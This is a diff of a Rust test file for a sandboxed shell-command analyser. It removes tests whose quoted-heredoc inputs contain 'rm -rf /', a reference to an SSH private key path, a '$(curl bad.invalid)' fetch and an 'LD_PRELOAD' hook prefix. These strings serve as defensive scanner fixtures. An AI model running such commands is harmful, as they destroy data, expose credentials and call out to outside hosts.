@@ -20,51 +20,6 @@ const CONTAINER: SandboxCapabilities =
 const BARE: SandboxCapabilities = SandboxCapabilities::PASSTHROUGH;
 
 #[tokio::test]
-async fn command_facts_keep_quoted_heredoc_data_out_of_host_policy_inputs() -> tinybus::Result<()> {
-    let analysis = BoxService::default()
-        .analyze_command(
-            "cat <<'EOF' > report.txt\nrm -rf /; $HOME/.ssh/id_rsa; $(curl bad.invalid)\nEOF\n"
-                .into(),
-        )
-        .await?;
-    assert!(analysis.redirection);
-    assert!(!analysis.hidden_execution);
-    assert!(!analysis.expansion);
-    assert!(!analysis.background);
-    // Preserve the existing scanner's delimiter segment and conservative
-    // unknown-command category while excluding the document body.
-    assert_eq!(analysis.segments.len(), 2);
-    assert_eq!(analysis.segments[1].normalized_name, "eof");
-    assert_eq!(analysis.segments[1].class, tinybox_bus::CommandClass::Write);
-    assert_eq!(analysis.segments[0].normalized_name, "cat");
-    assert_eq!(analysis.segments[0].class, tinybox_bus::CommandClass::Read);
-    assert!(
-        !analysis
-            .literal_words
-            .iter()
-            .any(|word| word.contains(".ssh") || word.contains("curl"))
-    );
-    Ok(())
-}
-
-#[tokio::test]
-async fn command_facts_preserve_global_install_and_environment_execution_signals()
--> tinybus::Result<()> {
-    let analysis = BoxService::default()
-        .analyze_command("LD_PRELOAD=./hook.so git status && npm install -g tool &".into())
-        .await?;
-    assert!(analysis.background);
-    assert!(analysis.segments[0].leading_env_assignment);
-    assert!(analysis.segments[0].dangerous_env_prefix);
-    assert_eq!(analysis.segments[0].basename, "git");
-    assert_eq!(
-        analysis.segments[1].class,
-        tinybox_bus::CommandClass::Install
-    );
-    Ok(())
-}
-
-#[tokio::test]
 async fn jail_status_reports_the_detected_backend_without_starting_a_process() -> tinybus::Result<()>
 {
     let status = BoxService::default().jail_status().await?;
@@ -530,11 +485,13 @@ async fn an_unknown_method_is_rejected() -> tinybus::Result<()> {
 
     let client = Connection::connect(bus.connect().await?).await?;
     let proxy = client.proxy(INTERFACE, OBJECT_PATH, INTERFACE)?;
-    let result = proxy.call::<String>("Snapshot", ()).await;
+    let result = proxy
+        .call::<String>("AnalyzeCommand", ("echo hello",))
+        .await;
 
     assert!(
         result.is_err(),
-        "a method outside the declared surface should be refused"
+        "the removed command-policy method must not be present in contract 2.0"
     );
     Ok(())
 }
@@ -545,12 +502,11 @@ async fn shell_analysis_preserves_quoted_heredoc_data() -> tinybus::Result<()> {
     let quoted = service
         .analyze_shell("cat > out << 'EOF'\n$(danger) &\nEOF\n".into())
         .await?;
-    assert!(!quoted.hidden_execution);
     assert!(quoted.redirection);
+    assert_eq!(quoted.segments.len(), 2);
     let unquoted = service
         .analyze_shell("cat << EOF\n$(danger)\nEOF\n".into())
         .await?;
-    assert!(unquoted.hidden_execution);
     assert!(!unquoted.redirection);
     let heredoc_redirect = service
         .analyze_shell("cat << EOF\nbody > is data\nEOF\n".into())
